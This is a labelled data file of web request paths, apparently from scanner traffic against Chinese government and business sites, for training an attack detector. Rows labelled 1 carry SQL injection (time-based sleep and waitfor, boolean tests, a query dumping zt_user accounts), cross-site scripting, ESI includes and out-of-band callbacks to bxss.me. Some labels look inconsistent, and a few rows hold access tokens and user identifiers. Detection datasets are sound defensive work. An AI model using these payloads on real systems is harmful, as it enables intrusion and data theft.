request	label
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u658c\u5b50\u5f00\u9501\u5e97	0
/xwzx' and 2*3*8=6*8 and 'dsfl'='dsfl/****/jtwxq/	1
"/*/server/news/show/title/time-for-a-heavy-harvest-new-release/src/""><script>alert(777)</script>@random4cd201e063d5c"	1
/****/xh/hy/201908/t20190808_1656007.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5229\u6da6	0
/******/appweb.do?method=appdatadetail&groupid=770&appid=2100&dataid=65787	0
/****/web/search?channelid=299868%' and 7466=7466 and '%'='&perpage=1000	1
"/****/system/2021/09/01'""""/><iframe src=javascript:alert(1822) /013442863.shtml"	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(4697)"">?_=1630312101338"	1
/***/0/01/92/05/1920548_262992.png	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u53f2\u4e09\u5b58\u8d27\u7269\u8fd0\u8f93\u90e8	0
/***********/userservice.aspx?dbid=5' and 6022=6150 and 'ljlo'='ljlo	1
/****/bmkx/sjsj/201805/t20180507_103160.html	0
/*********/20191202/javascript:void(0);	1
/****/20211118/10761.html	0
/****/system/2020/12/23/012107244.shtml	0
/***/zp-core/admin-upload.php?error=<script>alert(777)</script>	1
/****/system/2011/09/14/010467591.shtml	0
"/**/index.php?action=list&order=name&srt=yes&lang=en""/><script>alert(777);</script>"	1
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(488)</script>?_=1630311430045"	1
/****/bmkx/stjj/index_1.html	0
"/****/annonce/moteur-prix.php?categoriemoteur=1"""">alert(777);"	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u91cd\u5e86\u5b66\u743c\u624b\u5de5\u9c9c\u9762\u5e97	0
/****/bmkx/srsj/202106	0
"/'""""()&%<acx><script >ikcd(9168)</script>/****/sgaj/"	1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448%') and 5833=1069 and '%'='&wbfileid=51419	1
/***********/zaojianpinglun/?_=1640035214864	0
/****/wdszs/hfsz/202111/t20211105_196208.html	0
/***/gjcp/dgdz/xwzx/zdgz/ddjs/rlzy/gygj/dszzc/ywzzq/	0
/****/jtdt/2014jtdt/201412/t20141218_37238.html	0
/****/bmkx/sgtj/202110/t20211018_195419.html	0
/****/web/search?channelid=222832&searchword=\u6cfe\u6e90\u53bf\u5f18\u626c\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/zzxxgk/tjj/zfxxgkml_2127/zcjd_2053/202106/w020210623594394161615.png	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u70ab\u6f6e\u521b\u7f8e\u9986\u670d\u88c5\u5e97	0
/zwxx_11337/****/202111/t20211122_3141682.html/index_1.html	0
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/**/encrypt/jbase64.js"	1
/****/zrbg/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***/mswpmm/common/newaccount.aspx?btncancel=alert(777)	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u5317\u65b9\u72fc\u670d\u88c5\u5e97	0
/****/qzfwj/202104/t20210406_2695625.html	0
/***/blockdata/getsearchinfo.do?&title=\u6842\u82b1\u576a\u8857\u9053	0
/***/wxgw/images/x5.jpg	0
"/****/wordpress/wp-content/plugins/securimage-wp/siwp_test.php/""""/>alert(777);?tested=1"	1
/****/whhd/202105/'http:/leyubet1410.com/'	0
/****/xxgkml/hygq_3720/rdhy/201912/t20191202_145066.html	0
/****/gccb/wlgc/rlzy/rcgk/	0
/**/lznews/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u7075\u65b0\u77ff\u4f0a\u9999\u658b\u70e7\u70e4	0
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u4e09\u8425\u9547\u4e9a\u6960\u6728\u5668\u5382	0
/****/2021wlaqxcz/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/****/'.gethostbyname(lc('hitjz'.'uxsdohtfd5a3f.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(103).chr(78).chr(105).chr(82).'/sgaj/	1
/******/system/2021/03/13/javascript:void();	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u9547\u6717\u8bd7\u5fb7\u51c0\u6c34\u8bbe\u5907\u7ecf\u9500\u90e8	0
/**********/system/2020/06/07/013179593.shtml	0
/*******/qiye/spot-e106556.html	0
/*******/3b1.php	1
/****/byyw/202105/t20210520_182797.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6e20\u53e3\u81ea\u5fe0\u8c46\u8150\u52a0\u5de5\u5e97	0
"/****/zfwjn/'""""()&%<acx><script >u5ff(9486)</script>/1110/list.html"	1
/***/0/00/70/77/707765_298825.jpg	0
/**/system/2020/12/31/javascript:void(0);	1
/******/system/2019/09/26/012981580.shtml	1
/**/images/share_1.png	0
/*****/article-e135537346.html	0
/****/xxgkml/http://bxss.me/t/xss.html?	1
/****/b-e831502.html	0
/***/nbhd/opengovmsgbox.do?pageindex=1' waitfor delay '0:0:2&siteid=115&method=listgovmsgboxs&pagesize=15&appid=4	1
/****/byszx/201611/t20161121_76521.html?leader=\u5170\u6ee1\u590f	0
/**/dj/info_37.aspx?itemid=1524 and 7436=2228	1
/****/qhh/jy	0
"/****/czgk/bmyjs/zzqfyxt/ycxzjrmfy/201903/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u798f\u5efa\u529e\u4e8b\u5904</a>"	0
/**********/system/2021/12/14/013494331.shtml	0
/**************/newscenter/system/2021/12/20/013497316.shtml	0
/if(now()=sysdate(),sleep(12),0)/****************/index_2.html	1
/******//537/4fv8d5zw/xhr_send?t=1629431587665	1
/****************/notification/negotiate?access_token=653ae205-d149-493d-8ffb-d6d5b87baefe	0
/****/shzr/xfgj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***/blockdata/getsearchinfo.do?&title=\u58eb\u5175\u548c	0
/wp-content/******/rocked/jnk.php	1
/****/czgk/http://bxss.me/t/fit.txt?.jpg/gdyx/	1
/****/zdlygk/bzxajgc' and 2*3*8=6*8 and 'snbh'='snbh/szss/plx.htm	1
/****/zt/hjbhdc/201706/t20170620_320089.html	0
/******/hzhbz.jpg	0
/**********/system/2021/06/22/013406540.shtml	0
/***/minip/mama/cssy-1.png	0
/****/zt/2020wznb/gznbxjzf/202101/p020210128370049282153.pdf	0
/****/xqdt/byq/201810/w020181023391083313388.jpg	0
/**********/system/2021/12/13/javascript:void(0);	1
/******/fenx_xcr.jpg	0
//***********/jslib/grouppic/jquery.ad-gallery.js	1
/****/b-e908441.html	0
/****/xxgkml/qtfdxx/zdjcyjzj/202108/t20210823_185955_wap.html	0
/**********/system/2015/12/08/011882769.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u8001\u51af\u519c\u673a\u4fee\u7406\u90e8	0
/*******/js/setpassguardctrl?id=1	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u4e1c\u5854\u9547\u7ea2\u6885\u70e7\u70e4\u5c4b	0
/***/003/004/118/00300411812_d2adebf6.jpg	0
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=31&i_articleid=16944	0
/******/index.php?vyhl='>alert(777)&lang=cze	1
/*******/qiye/businesses-e50176_3.html?category_id=220307	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u679c\u7bee\u5b50\u8d85\u5e02	0
/****/xxgkml/hygq_3720/rdhy/202108/t20210823_185982.html	0
/**/viewspace-578.html	0
/*****/gy48/cpgyss.asp?key=\u7f8e\u5b5a\u9f7f\u8f6e\u6cb9shc&l=\ufffd\u03fa\ufffd	0
"/************/template/jcse/' 'a'.concat(70-3).concat(22*4).concat(105).concat(84).concat(112).concat(69) (require'socket'
socket.gethostbyname('hitsg' 'bwttwtqg20814.bxss.me.')[3].to_s) '/16/images/result.css"	1
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u672c	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u5b8f\u6770\u52b3\u52a1\u6709\u9650\u516c\u53f8	0
/zwxx_11337/****/201912/t20191226_1905153.html	0
/*******/zwgk/zfxxgk/fdzdgknr/qtfdxx/zfwj/	0
/****/zfxxgk1/fdzdgknr/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/1.htm	1
"/****/admin/ccmanage.php?find_enc=1&list=1""><script>alert(777)</script>"	1
/****/zdgz/2019_zdgz/index.html	0
/****/mwf5s5-hynews-e115401452.html	0
/****/system/2021/06/12/javascript:window.close();	1
/zwxx_11337/****/202109/t20210916_3033448_zzb.html	0
"/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqskylgbjdaj/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/****/20211206/10841.html	0
/****/ztly/http://bxss.me/t/xss.html?	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9ed1\u53c8\u4eae\u76ae\u5177\u4fdd\u517b\u5e97	0
/**********/system/2020/05/21/013167078.shtml	0
/**/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777)	1
/**********/system/<script>alert(924)</script>/013447361.shtml	1
/****/qywh/whhd/	1
/*******/5/jquery.db_tabmotionbanner.min.js	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u6c38\u4e50\u7cae\u6cb9\u5e97	0
/**********/system/2021/12/06/javascript:window.print()	1
/***/interface/url_total_pv.json.jsp?callback=jquery19106506748618662039_1640026178687	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u53e3\u798f\u8f69\u8fc7\u6865\u7c73\u7ebf\u5e97	0
/******/system/2013/09/16/011190054.shtml	0
"/****/xxgknb/2009/list.html?new=0.23190916418329843<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/****/qzfwj/202109/t20210906_3006306.html	0
/***/003/004/418/00300441825_4013e5f6.jpg	0
/****/czgk/bmyjs/zzqfyxt/hlxrmfy/202002/t20200210_1948836.html	0
/zwxx_11337/****/201707/t20170727_298444.html	0
"/**/products/industrialmachinery/201505/t20150513_60352.html/*/-->'""""></iframe></script></style></title></textarea><script >alert(83420)</script>"	1
/**********/system/2020/03/23/013122638.shtml	0
/****/text/2016-06/30/content_570531.htm	0
/****/zzxxgk/javascript:void(0);	1
/****/bmkx/sfgw/201705/t20170511_89867.html	0
/****/js/encrypt'||'/md5.js	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u66f9\u5174\u65d7\u7fbd\u7ed2\u670d\u5b9a\u5236\u5e97	0
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/http://bxss.me/t/xss.html?	1
/**********/gnxw/?	1
"/****/qzfwj/201810/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5e7f\u4e1c\u529e\u4e8b\u5904</a>"	0
/************/investment-advisory/0'xor(if(now()=sysdate(),sleep(9),0))xor'z-04-19/270.html	1
/**********/system/2021/12/12/013493308.shtml	0
/***/slash-cms/index.php?mod=sl_pages&id=alert(777)	1
/****/b-e873593.html	0
/****/czgk/bmyjs/zzqjcyxt/hlxrmjcy	0
/*******/202001/202001070930061023.html	0
/***/0/01/96/25/1962584_940524.jpg	0
/****/zzxxgk/tjj/zfxxgkml'||'_2127/jytabljg_2061/list.html	1
/***/blockdata/getsearchinfo.do?&title=\u6c38\u5b89\u4ea4\u8b66	0
/****/index_45.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u7984\u6e90\u71c3\u6c14\u670d\u52a1\u6709\u9650\u516c\u53f8	0
/***/0/02/11/45/2114554_177900.jpg	0
/****/xqdt/hnx/201905/t20190529_124129.html	0
/**********/system/2017/01/12/012224169.shtml	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u91d1\u6631\u5f3a\u5de5\u8d38\u6709\u9650\u516c\u53f8	0
/****/jtdt/gzxwjtdt/201412/w020141218453621484744.jpg	0
/*******/f4i1c.php	1
/if(now()=sysdate(),sleep(12),0)/******/gczlzl/1.htm	1
/*******/ui/widgets/scrollup/js/jquery.scrollup.min.js	1
/***/index.php?title=acunetixtest4b89a5&action=submit	1
/****/bmkx/sfgw/201812/local.replace(	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u5c0f\u5434\u51c9\u76ae\u5e97	0
/****/20211027/javascript:void(0);	1
/**/sybn/201412/w020150511448467021220.jpg	0
/*******/6dd2.php	1
/****/zfxxgk/bxss.me/t/xss.html?	1
/enjoymobilexcx_mt/****/downloadimage/?id=82ba210f-b6d9-4111-9b91-e976ba83d2d5	0
/*******/68hkd9v.php	1
"/******/jslib/urite/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z.js"	1
/******/user/gallery1.php?g_name=<script>alert(77729</script>	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u9ed1\u59b9\u65f6\u5c1a\u5973\u88c5\u5e97	0
/script%' and 2*3*8=6*8 and '9kuy'!='9kuy%/*/1905151614057782.js	1
/**********/system/2021/12/12/javascript:void(0);	1
"/'""""()&%<acx><script >5il4(9325)</script>/********/jcse/110105008056111/16/images/catesearchbtn.js"	1
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgxs/	0
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=bxss.me/t/xss.html?	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u7ecf\u6d4e\u5f00\u53d1\u533a\u6c7d\u901a\u6c7d\u8f66\u6c7d\u8f66\u88c5\u6f62\u5e97	0
/******/system/more/17937020000000000/0000/17937020000000000_00000001.shtml	0
/***/viewspace-551.html	0
/******/public/2021/03/01/102723.images/v102723_b1614569495294_app.jpg/index_1.html	0
"/****/server-session-details.jsp?hostname=""""/>alert(777)"	1
/****/bmkx/sgsj/202103/t20210312_178546_wap.html	0
/****/xxgkml/zdmsxx/list.html?new=/xfs.bxss.me	1
"/**/<img src=""javascript:alert(4735)"">"	1
/**********/system/2020/05/22/013168002.shtml	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtacxagbaegsyo4fc0kszdno=&openid=ovl7jjpkmiluw4auzpxfrcv_quyo&outer_str=quicklyrq,2,0,77105&activate_ticket=fdzv9emqaffrnr3xboqhbzu3vh9fk 07 ewewkjfafvoo8dbj5 fzedtzplsmcarxvioeup9q6wjeq/7lecrlmeqvk46vn6pkswzajx0cwe=	0
/***/minip/common/checkin-close.png	0
/**/system/count/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/*****/system/2020/09/16/javascript:void(0);	1
/****/xqdt/pcq/201610/t20161025_57027_wap.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u60a6\u9886\u6c7d\u8d38\u6709\u9650\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u5929\u5229\u9505\u7089\u6c34\u6696\u5927\u4e16\u754c	0
/**/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/******/swqh/img2/7.jpg	0
"/************/' 'a'.concat(70-3).concat(22*4).concat(106).concat(79).concat(109).concat(80) (require'socket'
socket.gethostbyname('hitfy' 'bcwdaevf889b3.bxss.me.')[3].to_s) '/jcse/website.js"	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtmcoujo5pr/y8kapnoetse8=&openid=ovl7jjvko1p2uukogtcaa_xko264&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb hg88yu pgsxl/cpxd460voo8dbj5 fzedtzplsmcarxxu4daweyoudld7jczqmyuyv1t6qqu2nnvhqwjd87ls=&code=081vrp100hzq0n1phu000p6jry3vrp1u	0
/*******/e78te.php	1
/*******/qiye/b-e2429837.html	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u548c\u7855\u4e30\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/2021/08/77095.html	0
/****/20211012/10564.html	0
/****/swb/ltgsz.com?n=11') and 3458=(select 3458 from pg_sleep(5)) and ('vaje'='vaje	1
/*******/thumb.php?src=<body onload=alert(777)>.jpg	1
/*******/ywly/myyfw/ywly/gccb/dlgc/qtyz/	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u8363\u8000\u4fe1\u606f\u90e8	0
/***/viewspace-401.html	0
"/****/wdsjs/hfswsj<esi:include src=""""http://bxss.me/rpb.png""""/>/zmhdyc.html"	1
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1&type[0]==2and 3 in &type[1]=3'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1738801731')))>'0	1
/***/blockdata/getsearchinfo.do?&title=\u6c38\u5ddd\u623f\u5c4b\u7ba1\u7406\u5c40	0
/****/zxxx/content.html?metadataid=10063077	0
/****/zdlygk/ncwywfgz'||'/ycs/hlx/xmb_gzdxb.htm	1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448' and 1821=1821	1
/*******/qiye/spot-e101488.html	0
"/************/template/jcse/110105008056111/16<esi:include src=""""http://bxss.me/rpb.png""""/>/images/jquery.autocomplete.js"	1
/*********/web/viewer.html?file=/uploadimg/gqtb/2019063pdf') and 6656=6656 and ('owpf'='owpf	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u94b0\u77f3\u88c5\u9970\u884c	0
/****/lkw/yw_1292/201702/t20170206_314866.html	0
/**/mswpmm/common/newaccount.aspx?email=alert(777)	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u6668\u5149\u6587\u5177\u5e97	0
"/***/col5/index.html/<img src=""javascript:alert(324)"">"	1
/****/zzxxgk/tjj/zfxxgkml_2127/xwfbh_2065/list.html?new=/xfs.bxss.me	1
"/**********/system/2021/09/07'""""/><img src=x onerror=alert(822)>/013447361.shtml"	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u76ca\u6c11\u8bca\u6240	0
/**/sustainability/csrreports/	1
/****************/notification?access_token=a070f983-f208-47c9-804d-9301a331d49d&id=undefined	0
/system'||'/********/js/newcalendar/wdatepicker.js	1
"/***/index.php?do=search&search=""><body onload=eval(alert(777)) ><!--"	1
/****/zgsdt/zgs16/201612/t20161227_130923.html	0
/******/cms/www/201709/12165051x0ky.jpg	0
/********/static/fonts/element-icons.535877f.woff	0
/***/0/02/10/69/2106954_618021.jpg	0
/*******/9igf1b.php	1
/***/blockdata/getsearchinfo.do?&title=.*\u4e0a\u6d77.*\u6848\u4ef6\u5f8b\u5e08.*\u5f8b\u5e08.*\u4e3a\u60a8.*\u6743\u76ca.*\u4fdd\u9a7e\u62a4\u822a.*\u8fd1\u5e74\u6765.*	0
/***/sousuo/?c=150	0
/****/gcjx/201411/w020141125638179169104.jpg	0
"/***/fiyo/?app=article&view=item31ab2"""">alert(777)0ccba&id=186"	1
/****/czgk/bmjs/zzqfyxt/qtxszjrmfy/201908/t20190808_1656832.html	0
/***/2021/9/2/art_121_239155.html	0
/**********/system/2021/12/03/javascript:window.close();	1
/****/zt/msss/msxw/202002/t20200227_1971835.html	0
/******/a1.png	0
/**********/system/2021/09/20/013454373.shtml	0
/***/0/00/52/15/521554_798511.jpg	1
/zwxx_11337/****/201809/t20180928_1085998.html	0
/*****/gy42/cpgyss.asp?key=\ufffd\u06f1\ufffd\u03e9\ufffd\ufffd\ufffd\u01ba\ufffd\u027b\ufffd&l2=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgbdsj/zzqxwcbgdj/201908/t20190808_1655549.html	0
/****/qzfwj/202110/t20211012_3080135.html/index_1.html	0
/**********/system/2021/05/09/013382223.shtml	0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd    \u04a2	0
"/**/scripts/booking/eventlist.php?serviceid=1337"" onmouseover=""alert(777)"	1
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u4e60\u5c97\u4f9b\u9500\u5408\u4f5c\u793e\u65b0\u5e73\u519c\u8d44\u7ecf\u9500\u90e8	0
/**/ourbusiness/projectcontracting/201412/w020150130302129482719.jpg	0
/**********/system/2019/02/20/012811067.shtml	0
/****/mjx/	0
/zwxx_11337/****/mtjd/202101/t20210122_2577316.html	0
/****/mswpmm/common/signin.aspx?btnsignin=alert(777)returnurl=/mswpmm/common/default.aspx	1
/****/xxgkml/qtfdxx/zdjcyjzj/202103/t20210311_178450.html	0
"/****/zdlygk/\""javascript:void(0)\"""	1
/****/b-e622805.html	0
/****/fzjx/202008/w020200821346017196797.jpg	0
/****/gccb/wjwszzgc/images/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/******/sub_menu_bg.jpg/*/-->'""""></iframe></script></style></title></textarea><script >alert(86439)</script>"	1
/**/news/xwygx/202109/t20210930_317981.html and 1=1	1
/******/system/2017/06/17/012336598.shtml	0
/**********/system/2021/08/08/013432084.shtml	0
/**/business/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/****/mtgz/gzxwmtgz/201412/t20141218_44868.html	0
/**********/system/2021/11/11/javascript:void();	1
/***/frontpage.do?title=\u65b0\u65f6\u4ee3\u5546\u4e1a\u5178\u8303\u7279\u522b\u91d1\u5956&view=staticfile/searchpath/hotlabel	0
/**/ui/lib/easyui/themes'||'/bootstrap/panel.css	1
/****/qyjbxx/gjjj/	1
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u7acb\u5c97\u9547\u5c0f\u9a6c\u6536\u8d2d\u7ad9	0
"/****/czgk/bmjs/zzqfyxt/ycxzjrmfy/201708/"">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a>"	0
/****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
/****/zgsdt/2020_qydt/202010/t20201020_254771.html	0
/zwxx_11337/****/201912/t20191219_1896602.html	0
/******/system/2012/08/25/010865639.shtml	0
/****/qzfwj/5619/5629/index.html	1
/**********/system/2020/03/17/013116737.shtml	0
"/****/zfwzjs/202101/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5e7f\u4e1c\u529e\u4e8b\u5904</a>"	0
/******/public/2020/06/08/97811.images/v97811_b1591582803396_app.jpg	0
/****/web/search?page=2&channelid=253477') and 8927=8927 and '1'='1&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
"/****/xxgknb/2012<esi:include src=""""http://bxss.me/rpb.png""""/>/list.html"	1
/*****/20161031/javascript:void(0);	1
/***/0/00/29/54/295414_815036.jpg	0
/****/system/2013/07/10/011131148.shtml	0
/****/web/search?page=2%') or 7878=2737 and '%'='&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
"/****/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/2021_mtgz/202105/t20210505_273338.html"	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(3731)</script>?_=1630312025768"	1
/***/0/02/12/40/2124076_339312.jpg	0
/_vsl/********************************/a8b1fc5a/1b7ea/	0
/*********/web/viewer.html?file=/uploadimg/gqtb/2019063pdf and 6656=6656	1
/****/sj1/tjsj/202108/w020210803337567275893.png	0
/****/system/2016/08/18/012096518.shtml	0
/******/system/2018/01/18/javascript:window.close();	1
/****/xqdt/hnx/201801/t20180126_99745.html	0
/***/0/02/12/11/2121177_337098.jpg	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u4fca\u777f\u5546\u884c	0
/**********/system/2020/03/27/013126449.shtml	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtcpsyrqthtshfxmbrqhvth8=&openid=ovl7jjoyp4lkcncb1fwty0nyoqpm&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb7cgcf9gqmnoi/ihq2 mqp/oo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbixh8xbbgp9gb7khuozdkomu=	0
